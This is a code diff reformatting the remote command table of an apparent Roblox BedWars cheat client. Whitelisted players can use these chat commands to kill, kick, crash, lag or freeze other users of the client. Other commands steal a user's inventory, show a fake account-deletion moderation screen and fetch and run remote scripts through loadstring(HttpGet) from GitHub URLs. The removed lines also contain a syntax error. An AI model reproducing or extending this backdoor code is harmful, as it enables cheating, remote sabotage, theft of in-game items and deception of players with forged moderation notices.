@@ -10722,436 +10722,447 @@ end
 
 --configcommands
 
-local commands = {[";kill default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead);
-	end
-end,[";reveal default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local textChatService = game:GetService("TextChatService");
-		wait(0.0001);
-		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I am using the inhaler client");
-	end
-end,[";void default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local character = game.Players.LocalPlayer.Character;
-		local humanoidRootPart = character:WaitForChild("HumanoidRootPart");
-		local newPosition = humanoidRootPart.CFrame;
-		for i = 1, 3 do
-			newPosition = newPosition + Vector3.new(0, -40, 0);
-			humanoidRootPart.CFrame = newPosition;
-			wait(0.01);
+local commands = {
+	[";kill default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
-	end
-end,[";suffocate default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local character = game.Players.LocalPlayer.Character;
-		local humanoidRootPart = character:WaitForChild("HumanoidRootPart");
-		local newPosition = humanoidRootPart.CFrame;
-		for i = 1, 3 do
-			newPosition = (newPosition + Vector3.new(0, -5, 0)) or (newPosition + Vector3.new(0, -6, 0)) or (newPosition + Vector3.new(0, -7, 0));
-			humanoidRootPart.CFrame = newPosition;
-			wait(0.01);
+	end,
+	[";reveal default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local textChatService = game:GetService("TextChatService")
+			wait(0.0001)
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I am using the inhaler client")
 		end
-	end
-end,[";blind default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local blur = Instance.new("BlurEffect");
-		blur.Size = 10000000000000;
-		blur.Parent = game.Lighting;
-	end
-end,[";unblind default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local blur = game.Lighting:FindFirstChildOfClass("BlurEffect");
-		if blur then
-			blur:Destroy();
-		end
-	end
-end,[";troll default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))();
-	end
-end,[";kick default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		wait(1);
-		for index, player in pairs(game.Players:GetPlayers()) do
-			player:Kick("A private member has kicked you from the game!");
-		end
-	end
-end,[";ban default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local rs = game:GetService("ReplicatedStorage");
-		local remote = rs:FindFirstChild("SelfReport", true);
-		remote:FireServer("injection_detected");
-	end
-end,[";rickroll default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))();
-	end
-end,[";freeze default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true;
-	end
-end,[";thaw default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false;
-	end
-end,[";lobby default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer();
-	end
-end,[";quitgame default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		game:Shutdown();
-	end
-end,[";lagback default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		for i = 1, 10 do
-			wait();
-			local player = game.Players.LocalPlayer;
-			local character = player.Character or player.CharacterAdded:Wait();
-			local humanoidRootPart = character:WaitForChild("HumanoidRootPart");
-			local forwardVector = humanoidRootPart.CFrame.LookVector;
-			local newPosition = humanoidRootPart.CFrame.p + (forwardVector * 1000000);
-			humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector);
-		end
-	end
-end,[";breakgame default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		pcall(function()
-			local replicatedStorage = game:GetService("ReplicatedStorage");
-			for _, child in ipairs(replicatedStorage:GetDescendants()) do
-				child:Destroy();
-			end
-		end);
-	end
-end,[";breakmap default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local function unanchorParts(object)
-			if object:IsA("BasePart") then
-				object.Anchored = false;
-			end
-			for _, child in ipairs(object:GetChildren()) do
-				unanchorParts(child);
+	end,
+	[";void default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local character = game.Players.LocalPlayer.Character
+			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+			local newPosition = humanoidRootPart.CFrame
+			for i = 1, 3 do
+				newPosition = newPosition + Vector3.new(0, -40, 0)
+				humanoidRootPart.CFrame = newPosition
+				wait(0.01)
 			end
 		end
-		unanchorParts(workspace);
-	end
-end,[";crash default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		while true do
+	end,
+	[";suffocate default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local character = game.Players.LocalPlayer.Character
+			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+			local newPosition = humanoidRootPart.CFrame
+			for i = 1, 3 do
+				newPosition = newPosition + Vector3.new(0, -5, 0) or newPosition + Vector3.new(0, -6, 0) or newPosition + Vector3.new(0, -7, 0)
+				humanoidRootPart.CFrame = newPosition
+				wait(0.01)
+			end
 		end
-	end
-end,[";infping default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local thingy = settings().Network;
-		thingy.IncomingReplicationLag = math.huge;
-	end
-end,[";lag default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local RunService = game:GetService("RunService");
-		local player = game.Players.LocalPlayer;
-		local character = player.Character or player.CharacterAdded:Wait();
-		local rootPart = character:WaitForChild("HumanoidRootPart");
-		RunService.Heartbeat:Connect(function()
+	end,
+	[";blind default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local blur = Instance.new("BlurEffect")
+			blur.Size = 10000000000000
+			blur.Parent = game.Lighting
+		end
+	end,
+	[";unblind default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
+			if blur then
+				blur:Destroy()
+			end
+		end
+	end,
+	[";troll default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
+		end
+	end,
+	[";kick default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			wait(1)
+			for index, player in pairs(game.Players:GetPlayers()) do
+				player:Kick("A private member has kicked you from the game!")
+			end
+		end
+	end,
+	[";ban default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local rs = game:GetService("ReplicatedStorage")
+			local remote = rs:FindFirstChild("SelfReport", true)
+			remote:FireServer("injection_detected")
+		end
+	end,
+	[";rickroll default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
+		end
+	end,
+	[";freeze default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
+		end
+	end,
+	[";thaw default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+		end
+	end,
+	[";lobby default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
+		end
+	end,
+	[";quitgame default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			game:Shutdown()
+		end
+	end,
+	[";lagback default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			for i = 1, 10 do
-				local part = Instance.new("Part");
-				part.Anchored = false;
-				part.CanCollide = true;
-				part.Transparency = 1;
-				part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0);
-				part.Parent = workspace;
+				wait()
+				local player = game.Players.LocalPlayer
+				local character = player.Character or player.CharacterAdded:Wait()
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+				local forwardVector = humanoidRootPart.CFrame.LookVector
+				local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+				humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
 			end
-		end);
-	end
-end,[";loopkill default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		_G.loopkill = true;
-		while _G.loopkill do
-			Game.Players.LocalPlayer.Character.Humanoid.Health = 0;
-			wait(4);
 		end
-	end
-end,[";unloopkill default"]=function()
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		_G.loopkill = false;
-		while _G.loopkill do
-			Game.Players.LocalPlayer.Character.Humanoid.Health = 0;
-			wait(3);
-		end
-	end
-end,[";fakeban default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes " .. math.random(45, 59) .. " seconds ]");
-	end
-	bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer();
-end,[";byfron default"]=function(args, plr)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox);
-		local Roact = getrenv().require(game:GetService("CorePackages").Roact);
-		UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig));
-		local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt);
-		local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme;
-		local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham;
-		local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
-		local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider;
-		lplr.PlayerGui:ClearAllChildren();
-		GuiLibrary.MainGui.Enabled = false;
-		game:GetService("CoreGui"):ClearAllChildren();
-		for i, v in pairs(workspace:GetChildren()) do
+	end,
+	[";breakgame default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			pcall(function()
-				v:Destroy();
-			end);
+				local replicatedStorage = game:GetService("ReplicatedStorage")
+				for _, child in ipairs(replicatedStorage:GetDescendants()) do
+					child:Destroy()
+				end
+			end)
 		end
-		task.wait(0.2);
-		lplr:Kick();
-		game:GetService("GuiService"):ClearError();
-		task.wait(2);
-		local gui = Instance.new("ScreenGui");
-		gui.IgnoreGuiInset = true;
-		gui.Parent = game:GetService("CoreGui");
-		local frame = Instance.new("Frame");
-		frame.BorderSizePixel = 0;
-		frame.Size = UDim2.new(1, 0, 1, 0);
-		frame.BackgroundColor3 = Color3.new(1, 1, 1);
-		frame.Parent = gui;
-		task.delay(0.1, function()
-			frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30);
-		end);
-		task.delay(2, function()
-			local e = Roact.createElement(auth, {style={},screenSize=((workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize) or Vector2.new(1920, 1080)),moderationDetails={punishmentTypeDescription="Delete",beginDate=DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - (60 * math.random(1, 6) * 1000)):ToIsoDate(),reactivateAccountActivated=true,badUtterances={},messageToUser="Your account has been deleted for violating our Terms of Use for exploiting."},termsActivated=function()
-				game:Shutdown();
-			end,communityGuidelinesActivated=function()
-				game:Shutdown();
-			end,supportFormActivated=function()
-				game:Shutdown();
-			end,reactivateAccountActivated=function()
-				game:Shutdown();
-			end,logoutCallback=function()
-				game:Shutdown();
-			end,globalGuiInset={top=0}});
-			local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {localization=tLocalization.mock()}, {Roact.createElement(UIBlox.Style.Provider, {style={Theme=darktheme,Font=gotham}}, {e})}));
-			Roact.mount(screengui, game:GetService("CoreGui"));
-		end);
-	end
-end,[";chipman default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man");
-	end
-end,[";josiah default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney");
-	end
-end,[";xylex default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local function transformImage(img, txt)
-			local function funnyfunc(v)
-				if (v:GetFullName():find("ExperienceChat") == nil) then
-					if (v:IsA("ImageLabel") or v:IsA("ImageButton")) then
-						v.Image = img;
-						v:GetPropertyChangedSignal("Image"):Connect(function()
-							v.Image = img;
-						end);
-					end
-					if (v:IsA("TextLabel") or v:IsA("TextButton")) then
-						if (v.Text ~= "") then
-							v.Text = txt;
-						end
-						v:GetPropertyChangedSignal("Text"):Connect(function()
-							if (v.Text ~= "") then
-								v.Text = txt;
+	end,
+	[";breakmap default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local function unanchorParts(object)
+				if object:IsA("BasePart") then
+					object.Anchored = false
+				end
+				for _, child in ipairs(object:GetChildren()) do
+					unanchorParts(child)
+				end
+			end
+			unanchorParts(workspace)
+		end
+	end,
+	[";crash default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			while true do end
+		end
+	end,
+	[";infping default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local thingy = settings().Network
+			thingy.IncomingReplicationLag = math.huge
+		end
+	end,
+	[";lag default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
+			local RunService = game:GetService("RunService")
+			local player = game.Players.LocalPlayer
+			local character = player.Character or player.CharacterAdded:Wait()
+			local rootPart = character:WaitForChild("HumanoidRootPart")
+			RunService.Heartbeat:Connect(function()
+				for i = 1, 10 do
+					local part = Instance.new("Part")
+					part.Anchored = false
+					part.CanCollide = true
+					part.Transparency = 1
+					part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
+					part.Parent = workspace
+				end
+			end)
+		end
+	end,
+	[";loopkill default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			_G.loopkill = true;
+			while _G.loopkill do
+				Game.Players.LocalPlayer.Character.Humanoid.Health = 0
+				wait(4)
+			end			
+		end
+	end,
+	[";unloopkill default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			_G.loopkill = false;
+			while _G.loopkill do
+				Game.Players.LocalPlayer.Character.Humanoid.Health = 0
+				wait(3)			
+			end
+		end
+	end,
+	[";fakeban default"] = function(args)
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+		    end
+		    bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+	    end,
+	[";byfron default"] = function(args, plr)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		            local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+					lplr.PlayerGui:ClearAllChildren()
+					GuiLibrary.MainGui.Enabled = false
+					game:GetService("CoreGui"):ClearAllChildren()
+					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+					task.wait(0.2)
+					lplr:Kick()
+					game:GetService("GuiService"):ClearError()
+					task.wait(2)
+					local gui = Instance.new("ScreenGui")
+					gui.IgnoreGuiInset = true
+					gui.Parent = game:GetService("CoreGui")
+					local frame = Instance.new("Frame")
+					frame.BorderSizePixel = 0
+					frame.Size = UDim2.new(1, 0, 1, 0)
+					frame.BackgroundColor3 = Color3.new(1, 1, 1)
+					frame.Parent = gui
+					task.delay(0.1, function()
+						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+					end)
+					task.delay(2, function()
+						local e = Roact.createElement(auth, {
+							style = {},
+							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+							moderationDetails = {
+								punishmentTypeDescription = "Delete",
+								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+								reactivateAccountActivated = true,
+								badUtterances = {},
+								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+							},
+							termsActivated = function() 
+								game:Shutdown()
+							end,
+							communityGuidelinesActivated = function() 
+								game:Shutdown()
+							end,
+							supportFormActivated = function() 
+								game:Shutdown()
+							end,
+							reactivateAccountActivated = function() 
+								game:Shutdown()
+							end,
+							logoutCallback = function()
+								game:Shutdown()
+							end,
+							globalGuiInset = {
+								top = 0
+							}
+						})
+						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+								localization = tLocalization.mock()
+							}, {Roact.createElement(UIBlox.Style.Provider, {
+									style = {
+										Theme = darktheme,
+										Font = gotham
+									},
+								}, {e})}))
+						Roact.mount(screengui, game:GetService("CoreGui"))
+					end)
+				end
+			end,
+	[";chipman default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			--transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
+		    --loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/chipman"))()
+		end
+	end,
+	[";josiah default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			--transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
+		    --loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/josiah"))()
+		end
+	end,
+	[";xylex default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    --loadstring(game:HttpGet("https://raw.githubusercontent.com/RayFaxiu/PrivateScripts/main/xylex"))()
+			--transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
+		end
+	end,
+	[";framerate default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    setfpscap(1)
+		end
+	end,
+	[";unframerate default"] = function(args)
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			setfpscap(9999)
+		end
+	end,
+	[";jump default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end
+	end,
+	[";sit default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = true
+			end
+		end
+	end,
+	[";trip default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if entityLibrary.isAlive then
+			    entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+			end
+		end
+	end,
+	[";unsit default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = false
+			end
+		end
+	end,
+	[";monkey default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    local str = ""
+			for i,v in pairs(args) do
+				str = str..v..(i > 1 and " " or "")
+				end
+				if str == "" then str = "skill issue" end
+				local video = Instance.new("VideoFrame")
+				video.Video = downloadVapeAsset("vape/assets/skill.webm")
+				video.Size = UDim2.new(1, 0, 1, 36)
+				video.Visible = false
+				video.Position = UDim2.new(0, 0, 0, -36)
+				video.ZIndex = 9
+				video.BackgroundTransparency = 1
+				video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+				local textlab = Instance.new("TextLabel")
+				textlab.TextSize = 45
+				textlab.ZIndex = 10
+				textlab.Size = UDim2.new(1, 0, 1, 36)
+				textlab.TextColor3 = Color3.new(1, 1, 1)
+				textlab.Text = str
+				textlab.Position = UDim2.new(0, 0, 0, -36)
+				textlab.Font = Enum.Font.Gotham
+				textlab.BackgroundTransparency = 1
+				textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+				video.Loaded:Connect(function()
+					video.Visible = true
+					video:Play()
+					task.spawn(function()
+						repeat
+							wait()
+							for i = 0, 1, 0.01 do
+								wait(0.01)
+								textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
 							end
-						end);
+						until true == false
+					end)
+				end)
+				task.wait(19)
+				task.spawn(function()
+					pcall(function()
+						if getconnections then
+							getconnections(entityLibrary.character.Humanoid.Died)
+						end
+						print(game:GetObjects("h29g3535")[1])
+					end)
+					while true do end
+				end)
+			end
+		end,
+	[";enable default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if #args >= 1 then
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
 					end
-					if (v:IsA("Texture") or v:IsA("Decal")) then
-						v.Texture - img
-						v:GetPropertyChangedSignal("Texture"):Connect(function()
-							v.Texture = img;
-						end);
-					end
-					if v:IsA("MeshPart") then
-						v.TextureID = img;
-						v:GetPropertyChangedSignal("TextureID"):Connect(function()
-							v.TextureID = img;
-						end);
-					end
-					if v:IsA("SpecialMesh") then
-						v.TextureId = img;
-						v:GetPropertyChangedSignal("TextureId"):Connect(function()
-							v.TextureId = img;
-						end);
-					end
-					if v:IsA("Sky") then
-						v.SkyboxBk = img;
-						v.SkyboxDn = img;
-						v.SkyboxFt = img;
-						v.SkyboxLf = img;
-						v.SkyboxRt = img;
-						v.SkyboxUp = img;
+					if module and not module.Api.Enabled then
+						module.Api.ToggleButton()
 					end
 				end
 			end
-			for i, v in pairs(game:GetDescendants()) do
-				funnyfunc(v);
-			end
-			game.DescendantAdded:Connect(funnyfunc);
-		end
-		transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex");
-	end
-end,[";framerate default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		setfpscap(1);
-	end
-end,[";unframerate default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		setfpscap(9999);
-	end
-end,[";jump default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		if (entityLibrary.isAlive and (entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air)) then
-			entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping);
-		end
-	end
-end,[";sit default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		if entityLibrary.isAlive then
-			entityLibrary.character.Humanoid.Sit = true;
-		end
-	end
-end,[";trip default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		if entityLibrary.isAlive then
-			entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics);
-		end
-	end
-end,[";unsit default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		if entityLibrary.isAlive then
-			entityLibrary.character.Humanoid.Sit = false;
-		end
-	end
-end,[";monkey default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		local str = "";
-		for i, v in pairs(args) do
-			str = str .. v .. (((i > 1) and " ") or "");
-		end
-		if (str == "") then
-			str = "skill issue";
-		end
-		local video = Instance.new("VideoFrame");
-		video.Video = downloadVapeAsset("vape/assets/skill.webm");
-		video.Size = UDim2.new(1, 0, 1, 36);
-		video.Visible = false;
-		video.Position = UDim2.new(0, 0, 0, -36);
-		video.ZIndex = 9;
-		video.BackgroundTransparency = 1;
-		video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay");
-		local textlab = Instance.new("TextLabel");
-		textlab.TextSize = 45;
-		textlab.ZIndex = 10;
-		textlab.Size = UDim2.new(1, 0, 1, 36);
-		textlab.TextColor3 = Color3.new(1, 1, 1);
-		textlab.Text = str;
-		textlab.Position = UDim2.new(0, 0, 0, -36);
-		textlab.Font = Enum.Font.Gotham;
-		textlab.BackgroundTransparency = 1;
-		textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay");
-		video.Loaded:Connect(function()
-			video.Visible = true;
-			video:Play();
-			task.spawn(function()
-				repeat
-					wait();
-					for i = 0, 1, 0.01 do
-						wait(0.01);
-						textlab.TextColor3 = Color3.fromHSV(i, 1, 1);
+		end,
+	[";disable default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if #args >= 1 then
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
 					end
-				until true == false 
-			end);
-		end);
-		task.wait(19);
-		task.spawn(function()
-			pcall(function()
-				if getconnections then
-					getconnections(entityLibrary.character.Humanoid.Died);
-				end
-				print(game:GetObjects("h29g3535")[1]);
-			end);
-			while true do
-			end
-		end);
-	end
-end,[";enable default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		if (#args >= 1) then
-			local module;
-			for i, v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do
-				if ((v.Type == "OptionsButton") and (i:lower() == (args[1]:lower() .. "optionsbutton"))) then
-					module = v;
-					break;
+					if module and module.Api.Enabled then
+						module.Api.ToggleButton()
+					end
 				end
 			end
-			if (module and not module.Api.Enabled) then
-				module.Api.ToggleButton();
-			end
-		end
-	end
-end,[";disable default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		if (#args >= 1) then
-			local module;
-			for i, v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do
-				if ((v.Type == "OptionsButton") and (i:lower() == (args[1]:lower() .. "optionsbutton"))) then
-					module = v;
-					break;
+		end,
+	[";toggle default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if #args >= 1 then
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module then
+						module.Api.ToggleButton()
+					end
 				end
 			end
-			if (module and module.Api.Enabled) then
-				module.Api.ToggleButton();
-			end
-		end
-	end
-end,[";toggle default"]=function(args)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-		if (#args >= 1) then
-			local module;
-			for i, v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do
-				if ((v.Type == "OptionsButton") and (i:lower() == (args[1]:lower() .. "optionsbutton"))) then
-					module = v;
-					break;
+		end,
+	[";steal default"] = function(args, plr)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
+					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
+					task.wait(1)
+				end
+				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
+					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
+						item = v.tool,
+						amount = v.amount ~= math.huge and v.amount or 99999999
+					})
+					if e then 
+						e.CFrame = plr.Character.HumanoidRootPart.CFrame
+					else
+						v.tool:Destroy()
+					end
 				end
 			end
-			if module then
-				module.Api.ToggleButton();
-			end
+		end,
+	[";uninject default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    GuiLibrary.SelfDestruct()
+		end
+	end,
+	[";gravity default"] = function(args)
+	    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+		    workspace.Gravity = tonumber(args[1]) or 192.6
 		end
 	end
-end,[";steal default"]=function(args, plr)
-	if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
